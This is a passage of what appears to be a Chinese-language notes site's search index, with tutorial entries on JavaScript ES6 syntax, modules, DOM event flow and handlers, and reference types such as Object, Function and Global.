\u5728ES6\u4e2d\uff0c\u5f53\u5c5e\u6027\u540d\u548c\u5c40\u90e8\u53d8\u91cf\u540d\u662f\u4e00\u6837\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u7701\u7565\u5b83\u540e\u9762\u7684\u5192\u53f7\u548c\u503c\nfunction createPerson(name, age) {\n  return {\n    name: name,\n    age: age,\n  };\n}\n\nfunction createPerson(name, age) {\n  return {\n    name,\n    age,\n  };\n}\n\n// \u9664\u4e86\u5c5e\u6027\u53ef\u4ee5\u7b80\u5199\u5916\uff0c\u65b9\u6cd5\u4e5f\u662f\u53ef\u4ee5\u7b80\u5199\u7684\u3002\u5728ES5\u6216\u4e4b\u524d\uff0c\u6211\u4eec\u5b9a\u4e49\u65b9\u6cd5\u5fc5\u987b\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a\nvar person = {\n  name: \"Nicholas\",\n  sayName: function () {\n    console.log(this.name);\n  },\n};\n// \u4f46\u5728ES6\u4e2d\uff0c\u901a\u8fc7\u7701\u7565\u5192\u53f7\u548cfunction\u5173\u952e\u5b57\uff0c\u4f7f\u8bed\u6cd5\u53d8\u5f97\u66f4\u52a0\u7b80\u6d01\u3002\u4f60\u53ef\u4ee5\u91cd\u5199\u4e4b\u524d\u7684\u4f8b\u5b50\uff1a\nvar person = {\n  name: \"Nicholas\",\n  sayName() {\n    console.log(this.name);\n  },\n};\n// \u4e0a\u8ff0\u4e24\u79cd\u8bed\u6cd5\u7701\u7565\u5728vue\u4e2d\u7ecf\u5e38\u51fa\u73b0\n</code></pre>"},{"location":"web/javascript/es6/#_2","title":"\u6a21\u677f\u5b57\u7b26\u4e32","text":"<p>\u53c2\u8003\uff1aTemplate_literals</p> <p>\u5373\u53cd\u5f15\u53f7`\uff0c\u901a\u8fc7\u53cd\u5f15\u53f7\u5305\u88f9\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5b9e\u73b0\u4e00\u4e9b\u529f\u80fd\u3002</p> <p>\u8bed\u6cd5\uff1a</p> <pre><code>`string text``string text line 1\n string text line 2``string text ${expression} string text`;\n\ntag`string text ${expression} string text`;\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <pre><code>var a = 5;\nvar b = 10;\nconsole.log(`Fifteen is ${a + b} and\nnot ${2 * a + b}.`);\n// \"Fifteen is 15 and\n// not 20.\"\n</code></pre>"},{"location":"web/javascript/es6/#_3","title":"\u89e3\u6784\u8d4b\u503c","text":"<p>\u89e3\u6784\u8d4b\u503c \u8bed\u6cd5\u662f\u4e00\u79cd Javascript \u8868\u8fbe\u5f0f\u3002\u901a\u8fc7 \u89e3\u6784\u8d4b\u503c\uff0c\u53ef\u4ee5\u5c06\u5c5e\u6027/\u503c\u4ece\u5bf9\u8c61/\u6570\u7ec4\u4e2d\u53d6\u51fa,\u8d4b\u503c\u7ed9\u5176\u4ed6\u53d8\u91cf\u3002</p> <ul> <li>\u89e3\u6784\u6570\u7ec4\uff1a\u4f7f\u7528[]\u5c06\u53d8\u91cf\u62ec\u8d77\u6765\u63a5\u6536</li> </ul> <pre><code>// \u57fa\u7840\u4f7f\u7528\nvar foo = [\"one\", \"two\", \"three\"];\n\nvar [one, two, three] = foo;\nconsole.log(one); // \"one\"\nconsole.log(two); // \"two\"\nconsole.log(three); // \"three\"\n\n// \u5c06\u5269\u4f59\u6570\u7ec4\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf\nvar [a, ...b] = [1, 2, 3];\nconsole.log(a); // 1\nconsole.log(b); // [2, 3]\n\n// \u8bbe\u7f6e\u9ed8\u8ba4\u503c\nvar a, b;\n\n[a = 5, b = 7] = [1];\nconsole.log(a); // 1\nconsole.log(b); // 7\n</code></pre> <ul> <li>\u89e3\u6784\u5bf9\u8c61</li> </ul> <pre><code>// \u57fa\u7840\u7528\u6cd5\nvar o = { p: 42, q: true };\nvar { p, q } = o;\n\nconsole.log(p); // 42\nconsole.log(q); // true\n\n// \u9ed8\u8ba4\u503c\nvar { a = 10, b = 5 } = { a: 3 };\n\nconsole.log(a); // 3\nconsole.log(b); // 5\n</code></pre>"},{"location":"web/javascript/es6/#_4","title":"\u6a21\u5757\u5316","text":"<p>\u5728 ES6 \u524d\uff0c \u5b9e\u73b0\u6a21\u5757\u5316\u4f7f\u7528\u7684\u662f RequireJS \u6216\u8005 seaJS\uff08\u5206\u522b\u662f\u57fa\u4e8e AMD \u89c4\u8303\u7684\u6a21\u5757\u5316\u5e93\uff0c \u548c\u57fa\u4e8e CMD \u89c4\u8303\u7684\u6a21\u5757\u5316\u5e93\uff09\u3002</p> <p>ES6 \u5f15\u5165\u4e86\u6a21\u5757\u5316\uff0c\u5176\u8bbe\u8ba1\u601d\u60f3\u662f\u5728\u7f16\u8bd1\u65f6\u5c31\u80fd\u786e\u5b9a\u6a21\u5757\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u4ee5\u53ca\u8f93\u5165\u548c\u8f93\u51fa\u7684\u53d8\u91cf\u3002</p> <p>ES6 \u7684\u6a21\u5757\u5316\u5206\u4e3a\uff1a\u5bfc\u51fa\uff08export\uff09 @\u4e0e\u5bfc\u5165\uff08import\uff09\u4e24\u4e2a\u6a21\u5757\u3002</p> <p>\u6a21\u5757\u5bfc\u51fa\uff0c\u53ef\u4ee5\u5bfc\u51fa\u5404\u79cd\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u5982\u5b57\u7b26\u4e32\u3001\u6570\u503c\u3001\u51fd\u6570\u548c\u7c7b\u3002</p> <p>\u5bfc\u51fa\u7684\u4e24\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>export default\uff1a\u53ea\u80fd\u6709\u4e00\u4e2a\uff0c\u4e14\u5bfc\u5165\u65f6\u53ef\u4ee5\u968f\u610f\u547d\u540d</li> <li>\u666e\u901a export\uff1a\u53ef\u4ee5\u6709\u65e0\u6570\u4e2a\uff0c\u5728\u5bfc\u5165\u65f6\u9700\u8981\u52a0\u4e0a{}</li> </ul> <pre><code>// xxx.js\nvar name = \"wlq\";\nfunction sayhi(num) {\n  console.log(\"hi\");\n}\nfunction plus(num) {\n  return num++;\n}\nexport default plus;\nexport { sayhi };\nexport { name as name_alias }; // \u5bfc\u51fa\u5e76\u91cd\u547d\u540d\n</code></pre> <p>\u5bfc\u5165</p> <pre><code>import random_name_for_default from \"./xxx.js\";\nimport {sayhi} from \"./xxx.js\";\nimport {name_alias as name_alias_alias} \"./xxx.js\";   //\u6b64\u5904\u53ef\u4ee5\u518d\u53d6\u4e00\u4e2a\u522b\u540d\n</code></pre> <p>Note</p> <p>To load an ES module, set \"type\": \"module\" in the package.json or use the .mjs extension</p>"},{"location":"web/javascript/es6/#promise","title":"Promise \u5bf9\u8c61","text":"<p>\u53c2\u8003\uff1aes6-promise</p> <p>\u662f\u5f02\u6b65\u7f16\u7a0b\u7684\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u3002</p> <p>\u4ece\u8bed\u6cd5\u4e0a\u8bf4\uff0cPromise \u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4ece\u5b83\u53ef\u4ee5\u83b7\u53d6\u5f02\u6b65\u64cd\u4f5c\u7684\u6d88\u606f\u3002</p>"},{"location":"web/javascript/es6/#async","title":"async \u5173\u952e\u5b57","text":"<p>async \u662f ES7 \u624d\u6709\u7684\u4e0e\u5f02\u6b65\u64cd\u4f5c\u6709\u5173\u7684\u5173\u952e\u5b57\uff0c\u548c Promise \uff0c Generator \u6709\u5f88\u5927\u5173\u8054\u7684\u3002</p>"},{"location":"web/javascript/es6/#_5","title":"\u5c55\u5f00\u8bed\u6cd5","text":"<pre><code>list = [1, 2, 3];\nlist_new = [1];\nlist_new.length = 0; // \u6e05\u7a7alist_new\nlist_new.push(...list); // list_new [1,2,3]\n\nobj = { a: 1, b: 2 };\nobj_new = {};\n</code></pre>"},{"location":"web/javascript/event/","title":"\u4e8b\u4ef6","text":""},{"location":"web/javascript/event/#_2","title":"\u7b80\u4ecb","text":"<p>JS \u4e0e HTML \u4e4b\u95f4\u7684\u4ea4\u4e92\u662f\u901a\u8fc7\u4e8b\u4ef6\u5b9e\u73b0\u7684\u3002</p> <p>\u4e8b\u4ef6\uff0c\u5c31\u662f\u6587\u6863\u6216\u6d4f\u89c8\u5668\u7a97\u53e3\u4e2d\u53d1\u751f\u7684\u4e00\u4e9b\u7279\u5b9a\u7684\u4ea4\u4e92\u77ac\u95f4\u3002\u53ef\u4ee5\u4f7f\u7528</p> <p>\u4fa6\u542c\u5668 (\u6216\u5904\u7406\u7a0b\u5e8f)\u6765\u6765\u9884\u5b9a\u4e8b\u4ef6\uff0c\u4ee5\u4fbf\u4e8b\u4ef6\u53d1\u751f\u65f6\u6267\u884c\u76f8\u5e94\u7684\u4ee3\u7801\u3002</p> <p>\u4e8b\u4ef6\u6d41\uff1a\u63cf\u8ff0\u7684\u662f\u4ece\u9875\u9762\u4e2d\u63a5\u53d7\u4e8b\u4ef6\u7684\u987a\u5e8f\u3002</p> <p>IE \u548c Netscape \u5f00\u53d1\u56e2\u961f\u63d0\u51fa\u4e86\u4e24\u79cd\u51e0\u4e4e\u5b8c\u5168\u76f8\u53cd\u7684\u4e8b\u4ef6\u6d41\u7684\u6982\u5ff5\u3002</p> <p>\u4e00\u3001IE\uff1a\u4e8b\u4ef6\u5192\u6ce1\u6d41\uff0c\u4e8b\u4ef6\u5f00\u59cb\u7531\u6700\u5177\u4f53\u7684\u5143\u7d20\u63a5\u53d7\uff0c\u7136\u540e\u9010\u7ea7\u5411\u4e0a\u4f20\u64ad\u5230\u8f83\u4e3a\u4e0d\u5177\u4f53\u7684\u8282\u70b9\u3002</p> <pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;Event Bubbling Example&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id=\"myDiv\"&gt;Click Me&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u5982\u679c\u4f60\u5355\u673a\u4e86\u9875\u9762\u4e2d\u7684 <code>&lt;div&gt;</code> \u5143\u7d20\uff0c\u90a3\u4e48\u8fd9\u4e2a click \u4e8b\u4ef6\u4f1a\u6309\u7167\u5982\u4e0b\u987a\u5e8f\u4f20\u64ad\uff1a</p> <p>\u2460<code>&lt;div&gt;</code> \u2461<code>&lt;body&gt;</code> \u2462<code>&lt;html&gt;</code> \u2463document</p> <p>\u4e8c\u3001NC\uff1a\u4e8b\u4ef6\u6355\u83b7\u6d41\uff0c\u4e8b\u4ef6\u6355\u83b7\u7684\u601d\u60f3\u662f\u4e0d\u592a\u5177\u4f53\u7684\u8282\u70b9\u5e94\u8be5\u66f4\u65e9\u63a5\u53d7\u5230\u4e8b\u4ef6\uff0c\u800c\u6700\u5177\u4f53\u7684\u8282\u70b9\u5e94\u8be5\u6700\u540e\u63a5\u53d7\u5230\u3002\u5982\u4e0a\u8ff0 click \u4e8b\u4ef6\u4f20\u64ad\u987a\u5e8f\u5e94\u4e3a\uff1a</p> <p>\u2460document \u2461<code>&lt;html&gt;</code> \u2462<code>&lt;body&gt;</code> \u2463<code>&lt;div&gt;</code></p> <p>DOM \u4e8b\u4ef6\u6d41\uff1aDOM2 \u7ea7\u4e8b\u4ef6 \u89c4\u5b9a\u7684\u4e8b\u4ef6\u6d41\u5305\u62ec\u4e09\u4e2a\u9636\u6bb5\uff1a</p> <ol> <li>\u4e8b\u4ef6\u6355\u83b7\u9636\u6bb5\uff1a\u6355\u83b7\u9636\u6bb5\uff0c\u4e8b\u4ef6\u4ece document \u5230 <code>&lt;html&gt;</code> \u518d\u5230 <code>&lt;body&gt;</code> \u5c31\u505c\u6b62\u3002</li> <li>\u5904\u4e8e\u76ee\u6807\u9636\u6bb5\uff1a\u4e8b\u4ef6\u5728 <code>&lt;div&gt;</code> \u4e0a\u53d1\u751f</li> <li>\u4e8b\u4ef6\u5192\u6ce1\u9636\u6bb5\uff1a\u5192\u6ce1\u9636\u6bb5\u53d1\u751f\uff0c\u4e8b\u4ef6\u53c8\u4f20\u64ad\u56de\u6587\u6863\u3002</li> </ol>"},{"location":"web/javascript/event/#_3","title":"\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f","text":"<p>\u4e8b\u4ef6\u5c31\u662f\u7528\u6237\u6216\u6d4f\u89c8\u5668\u81ea\u8eab\u6267\u884c\u7684\u67d0\u79cd\u52a8\u4f5c\u3002\u8bf8\u5982 click\u3001load \u548c mouseover\uff0c\u90fd\u662f\u4e8b\u4ef6\u7684\u540d\u5b57\u3002</p> <p>\u800c\u54cd\u5e94\u67d0\u4e2a\u4e8b\u4ef6\u7684\u51fd\u6570\u5c31\u53eb\u505a \u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f(\u6216\u4e8b\u4ef6\u4fa6\u542c\u5668)\uff0c\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u540d\u5b57\u4ee5 <code>on</code> \u5f00\u5934\uff0c\u56e0\u6b64 click \u4e8b\u4ef6\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u5c31\u662f onclick\uff0cload\u2192onload\u3002</p> <p>\u4e3a\u4e8b\u4ef6\u6307\u5b9a\u5904\u7406\u7a0b\u5e8f\u7684\u65b9\u5f0f\u4e5f\u6709\u591a\u79cd\uff1a</p>"},{"location":"web/javascript/event/#html","title":"HTML \u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f","text":"<p>\u67d0\u4e2a\u5143\u7d20\u652f\u6301\u6bcf\u79cd\u4e8b\u4ef6\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u4e0e\u76f8\u5e94\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u540c\u540d\u7684 HTML \u7279\u6027\u6765\u5236\u5b9a\uff0c\u8fd9\u4e2a\u7279\u6027\u7684\u503c\u5e94\u8be5\u662f\u80fd\u591f\u6267\u884c\u7684 JS \u4ee3\u7801\u3002</p> <pre><code>&lt;input type=\"button\" value=\"Click Me\" onclick=\"alert('clicked')\" /&gt;\n\n&lt;script&gt;\n        function showMessage(){alert(\"Hellow\");}\n&lt;/script&gt;\n\n&lt;input type=\"button\" value=\"Click Me\" onclick=\"showMessage()\" /&gt;\n</code></pre>"},{"location":"web/javascript/event/#dom0","title":"DOM0 \u7ea7\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f","text":"<p>\u6bcf\u4e2a\u5143\u7d20\u90fd\u6709\u81ea\u5df1\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u5c5e\u6027\uff0c\u5982 onclick\uff0c\u5c06\u8fd9\u4e2a\u5c5e\u6027\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u6307\u5b9a\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u3002</p> <pre><code>var btn = document.getElementById(\"myBtn\");\nbtn.onclick = function () {\n  alert(\"clciked\");\n};\n</code></pre>"},{"location":"web/javascript/event/#dom2","title":"DOM2 \u7ea7\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f","text":"<p>DOM2 \u7ea7\u4e8b\u4ef6\u5b9a\u4e49\u4e86\u4e24\u4e2a\u65b9\u6cd5\uff0c\u7528\u4e8e\u5904\u7406\u6307\u5b9a\u548c\u5220\u9664\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u64cd\u4f5c\uff1a</p> <ul> <li>addEventListener()</li> <li>removeEventListener()</li> </ul> <p>\u6240\u6709 DOM \u8282\u70b9\u4e2d\u90fd\u5305\u542b\u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff0c\u5e76\u4e14\u90fd\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff1a</p> <ul> <li>\u8981\u5904\u7406\u7684\u4e8b\u4ef6\u540d</li> <li>\u4f5c\u4e3a\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u51fd\u6570</li> <li>\u5e03\u5c14\u503c</li> <li>true\uff1a\u6355\u83b7\u9636\u6bb5\u8c03\u7528\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f</li> <li>false\uff1a\u5192\u6ce1\u9636\u6bb5\u8c03\u7528\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f</li> </ul> <pre><code>var btn = document.getElementById(\"myBtn\");\nbtn.addEventListener(\n  \"click\",\n  function () {\n    alert(this.id);\n  },\n  false\n);\nbtn.addEventListener(\n  \"click\",\n  function () {\n    alert(\"clicked\");\n  },\n  false\n);\n</code></pre> <p>\u53ef\u89c1\uff0c\u4f7f\u7528 DOM2 \u7ea7\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u7684\u597d\u5904\u662f\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u3002</p> <p>\u6ce8\u610f\uff1a\u901a\u8fc7 addEventListener()\u6dfb\u52a0\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u53ea\u80fd\u901a\u8fc7 removeEventListener()\u6765\u79fb\u9664\u3002</p>"},{"location":"web/javascript/event/#ie","title":"IE \u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u548c\u8de8\u6d4f\u89c8\u5668\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f","text":"<p>\u6682\u4e14\u4e0d\u8c08\u3002</p>"},{"location":"web/javascript/event/#_4","title":"\u4e8b\u4ef6\u5bf9\u8c61","text":"<p>\u5728\u89e6\u53d1 DOM \u4e0a\u7684\u67d0\u4e2a\u4e8b\u4ef6\u65f6\uff0c\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e8b\u4ef6\u5bf9\u8c61 <code>event</code> \uff0c\u8be5\u5bf9\u8c61\u5305\u542b\u7740\u6240\u6709\u4e0e\u4e8b\u4ef6\u6709\u5173\u7684\u4fe1\u606f\u3002</p> <p>\u517c\u5bb9 DOM \u7684\u6d4f\u89c8\u5668\u90fd\u4f1a\u5c06\u4e00\u4e2a event \u5bf9\u8c61\u4f20\u5165\u5230\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u65e0\u8bba\u662f DOM0 \u7ea7\u8fd8\u662f DOM2 \u7ea7\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\uff0c\u90fd\u4f1a\u4f20\u5165 event \u5bf9\u8c61\u3002</p> <p>event \u5bf9\u8c61\u5305\u542b\u521b\u5efa\u5b83\u7684\u7279\u5b9a\u4e8b\u4ef6\u6709\u5173\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff1a</p> <ul> <li>type\uff1a\u88ab\u89e6\u53d1\u7684\u4e8b\u4ef6\u7684\u7c7b\u578b</li> <li>target\uff1a\u4e8b\u4ef6\u7684\u76ee\u6807</li> <li>stopPropagation()\uff1a\u53d6\u6d88\u4e8b\u4ef6\u7684\u8fdb\u4e00\u6b65\u6355\u83b7\u6216\u5192\u6ce1</li> <li>...</li> </ul> <pre><code>var btn = document.getElementById(\"myBtn\");\nvar f = function (event) {\n  alert(event.type); //\"click\"\n};\n\nbtn.onclick = f;\nbtn.addEventListener(\"click\", f, false);\n</code></pre>"},{"location":"web/javascript/object/","title":"\u5f15\u7528\u7c7b\u578b\u548c\u5bf9\u8c61","text":"<p>\u5728 ECMAScript \u4e2d\uff0c\u5f15\u7528\u7c7b\u578b\u662f\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u7528\u4e8e\u5c06\u6570\u636e\u548c\u529f\u80fd\u7ec4\u7ec7\u5728\u4e00\u8d77\u3002\u4e0d\u59a5\u5f53\u7684\u79f0\u547c\u4e3a: \u7c7b\u3002</p> <p>\u5bf9\u8c61\u662f\u67d0\u4e2a\u7279\u5b9a\u5f15\u7528\u7c7b\u578b\u7684\u5b9e\u4f8b\u3002\u65b0\u5bf9\u8c61\u662f\u4f7f\u7528 <code>new</code> \u624d\u505a\u9644\u540e\u8ddf\u4e00\u4e2a <code>\u6784\u9020\u51fd\u6570</code> \u6765\u521b\u5efa\u7684\u3002</p> <p>\u6784\u9020\u51fd\u6570\u7684\u5f62\u5f0f\u548c\u666e\u901a\u51fd\u6570\u6ca1\u6709\u533a\u522b\uff0c\u53ea\u662f\u8be5\u51fd\u6570\u662f\u5904\u4e8e\u521b\u5efa\u65b0\u5bf9\u8c61\u7684\u76ee\u7684\u800c\u5b9a\u4e49\u7684\u3002</p>"},{"location":"web/javascript/object/#object","title":"Object \u7c7b\u578b","text":"<p>Object \u7c7b\u578b\u5e76\u4e0d\u5177\u5907\u591a\u5c11\u529f\u80fd\uff0c\u4f46\u5bf9\u4e8e\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u50a8\u548c\u4f20\u8f93\u6570\u636e\u800c\u8a00\uff0c\u662f\u5341\u5206\u7406\u60f3\u7684\u9009\u62e9\uff0c\u521b\u5efa Object \u5b9e\u4f8b\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a</p> \u65b9\u6cd5\u4e00\uff1a\u5bf9\u8c61\u5b57\u9762\u91cf\u8868\u793a\u6cd5<pre><code>var person = {\n  age: 32,\n  name: [\"Bob\", \"Smith\"],\n  gender: \"male\",\n  interests: [\"music\", \"skiing\"],\n  bio: function () {\n    alert(\n      this.name[0] +\n        \" \" +\n        this.name[1] +\n        \" is \" +\n        this.age +\n        \" years old. He likes \" +\n        this.interests[0] +\n        \" and \" +\n        this.interests[1] +\n        \".\"\n    );\n  },\n  greeting: function () {\n    alert(\"Hi! I'm \" + this.name[0] + \".\");\n  },\n};\n</code></pre> \u65b9\u6cd5\u4e8c\uff1anew<pre><code>var person = new Object();\nperson.age = 32;\nperson.xxx = xxx;\n</code></pre> <p>\u83b7\u53d6\u5bf9\u8c61\u5c5e\u6027\u4e5f\u6709\u4e24\u79cd\u65b9\u6cd5\uff1a</p> \u65b9\u6cd5\u4e00\uff1a\u70b9\u8868\u793a\u6cd5<pre><code>person.name[0];\n</code></pre> \u65b9\u6cd5\u4e8c\uff1an\u62ec\u53f7\u8868\u793a\u6cd5<pre><code>person[\"name\"][0];\n</code></pre>"},{"location":"web/javascript/object/#arraydateregexp","title":"Array\u3001Date\u3001RegExp \u7c7b\u578b","text":"<p>\u9664 Object \u7c7b\u578b\u5916\uff0c\u8fd8\u6709 Array\u3001Date \u7c7b\u578b\u7b49\uff0c\u4e0d\u8d58\u8ff0\u3002</p> <p>\u6b64\u5904\u4ecb\u7ecd\u4e0b RegExp \u7c7b\u578b\uff0cECMAScript \u901a\u8fc7 RegExp \u6765\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p>"},{"location":"web/javascript/object/#function","title":"Function \u7c7b\u578b","text":"<p>\u5728 ECMAScript \u4e2d\uff0c\u6bcf\u4e2a\u51fd\u6570\u90fd\u662f Function \u7c7b\u578b\u7684\u5b9e\u4f8b\uff0c\u800c\u4e14\u90fd\u4e0e\u5176\u4ed6\u5f15\u7528\u7c7b\u578b\u4e00\u6837\u5177\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <p>\u7531\u4e8e\u51fd\u6570\u662f\u5bf9\u8c61\uff0c\u56e0\u6b64\u51fd\u6570\u540d\u5b9e\u9645\u4e0a\u4e5f\u662f\u4e00\u4e2a\u6307\u5411\u51fd\u6570\u5bf9\u8c61\u7684\u6307\u9488\u3002</p> <p>\u5982\u4ee5\u4e0b\u4e09\u79cd\u5199\u6cd5\u51e0\u4e4e\u662f\u7b49\u4ef7\u7684\uff1a</p> <pre><code>// \u51fd\u6570\u58f0\u660e\nfunction sum(num1, num2) {\n  return num1 + num2;\n}\n\n// \u51fd\u6570\u8868\u8fbe\u5f0f\nvar sum = function (num1, num2) {\n  return num1 + num2;\n};\n\n// \u4e0d\u63a8\u8350\uff0c\u8fd9\u4f1a\u5bfc\u81f4\u89e3\u6790\u4e24\u6b21\u4ee3\u7801\nvar sum = new Function(\"num1\", \"num2\", \"return num1+num2\");\n</code></pre> <p>\u51fd\u6570\u58f0\u660e\u4e0e\u51fd\u6570\u8868\u8fbe\u5f0f\u7684\u533a\u522b</p> <p>\u89e3\u6790\u5668\u4f1a\u5148\u89e3\u6790 \u51fd\u6570\u58f0\u660e\uff0c\u56e0\u6b64\u4e0b\u8ff0\u4ee3\u7801\u53ef\u4ee5\u6b63\u5e38\u8fd0\u884c\uff1a</p> <pre><code>alert(sum(1,1));\nfunction sum(num1,num2){...};\n</code></pre> <p>\u4f46 \u51fd\u6570\u8868\u8fbe\u5f0f \u53ea\u4f1a\u987a\u5e8f\u8fd0\u884c\uff0c\u4e0b\u8ff0\u4ee3\u7801\u4f1a\u62a5\u9519\uff1a</p> <pre><code>alert(sum(1,1));\nvar sum = function (num1,num2){...};\n</code></pre> <p>\u6df1\u5165\u7406\u89e3\u91cd\u8f7d</p> <p>\u7531\u4e8e\u51fd\u6570\u540d\u53ea\u662f\u4e00\u4e2a\u6307\u5411\u51fd\u6570\u5bf9\u8c61\u7684\u6307\u9488\uff0c\u56e0\u6b64 ECMAScript \u51fd\u6570\u6ca1\u6709\u91cd\u8f7d\u4e5f\u5c31\u4fbf\u4e8e\u7406\u89e3\u4e86\uff0c\u5b9e\u9645\u4e0a\u7b2c\u4e8c\u6b21\u5b9a\u4e49\u76f8\u540c\u51fd\u6570\u540d\u7684\u51fd\u6570\u65f6\uff0c\u5b9e\u9645\u4e0a\u8986\u76d6\u4e86\u7b2c\u4e00\u4e2a\u51fd\u6570\u7684\u51fd\u6570\u540d\u53d8\u91cf\u3002</p> <pre><code>var sum = function () {}; // \u7b2c\u4e00\u6b21\u5b9a\u4e49\nsum = function () {}; // \u7b2c\u4e8c\u6b21\u5b9a\u4e49\uff0c\u8986\u76d6\u4e86sum\u53d8\u91cf\n</code></pre> <p>\u51fd\u6570\u4f5c\u4e3a\u503c</p> <p>\u7531\u4e8e\u51fd\u6570\u540d\u672c\u8eab\u5c31\u662f\u53d8\u91cf\uff0c\u6240\u4ee5\u51fd\u6570\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u503c\u4f7f\u7528\u3002</p> <p>\u4e0d\u4ec5\u53ef\u4ee5\u5411\u4f20\u9012\u53c2\u6570\u4e00\u6837\u628a\u4e00\u4e2a\u51fd\u6570\u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u800c\u4e14\u4e5f\u53ef\u4ee5\u5c06\u4e00\u4e2a\u51fd\u6570\u4f5c\u4e3a\u53e6\u4e00\u4e2a\u51fd\u6570\u7684\u7ed3\u679c\u8fd4\u56de\u3002</p> <pre><code>// \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u51fd\u6570\uff0c\u7b2c\u4e8c\u53c2\u6570\u662f\u8be5\u51fd\u6570\u9700\u8981\u7684\u53c2\u6570\nfunction CallFunction(Function, Argument) {\n  return Function(Argument);\n}\n</code></pre>"},{"location":"web/javascript/object/#booleannumberstring","title":"\u57fa\u672c\u5305\u88c5\u7c7b\u578b\uff1aBoolean\u3001Number\u3001String","text":""},{"location":"web/javascript/object/#global","title":"\u5355\u4f53\u5185\u7f6e\u5bf9\u8c61\uff1aGlobal","text":"<p>ECMAScript \u5bf9\u5185\u7f6e\u5bf9\u8c61\u7684\u5b9a\u4e49\u4e3a\uff1a\u6709 ECMAScript \u5b9e\u73b0\u63d0\u4f9b\u3001\u4e0d\u4f9d\u8d56\u4e8e\u5bbf\u4e3b\u73af\u5883\u7684\u5bf9\u8c61\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f00\u53d1\u4eba\u5458\u4e0d\u5fc5\u663e\u5f0f\u7684\u5b9e\u4f8b\u5316\u5185\u7f6e\u5bf9\u8c61\uff0c\u56e0\u4e3a\u5b83\u4eec\u5df2\u7ecf\u88ab\u5b9e\u4f8b\u5316\u4e86\u3002\u4f8b\u5982\uff1aObject\u3001Array\u3001Math \u548c String</p> <p>\u672c\u6b21\u4ecb\u7ecd\u53e6\u5916\u4e24\u4e2a\u5355\u4f53\u5185\u7f6e\u5bf9\u8c61\uff1aGlobal</p> <p>Global \u5bf9\u8c61</p> <p>\u8be5\u5bf9\u8c61\u662f ECMAScript \u4e2d\u6700\u7279\u522b\u7684\u4e00\u4e2a\u5bf9\u8c61\uff0c\u56e0\u4e3a\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u5176\u4ed6\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u6700\u7ec8\u90fd\u662f\u5b83\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002\u4f8b\u5982\uff1a</p> <ul> <li>URI \u7f16\u7801\u65b9\u6cd5\uff1aencodeURI()\u3001encodeURIComponent()\uff0c\u5bf9 URI \u8fdb\u884c\u7f16\u7801\uff0c\u4ee5\u4fbf\u53d1\u9001\u7ed9\u6d4f\u89c8\u5668\u3002decodeURI()\u3001decodeURIComponent()\u8fdb\u884c\u89e3\u7801\u3002</li> <li>eval()\u65b9\u6cd5\uff1a\u8be5\u65b9\u6cd5\u5c31\u50cf\u4e00\u4e2a ECMAScript \u89e3\u6790\u5668\uff0c\u5b83\u53ea\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u5373\u8981\u6267\u884c\u7684 ECMAScript \u5b57\u7b26\u4e32\u3002   <pre><code>eval(alert(\"hi\"));\n</code></pre></li> </ul> <p>Global \u5bf9\u8c61\u7684\u5c5e\u6027\uff1a</p> \u5c5e\u6027 \u8bf4\u660e undefined\u3001Infinity\u3001NaN 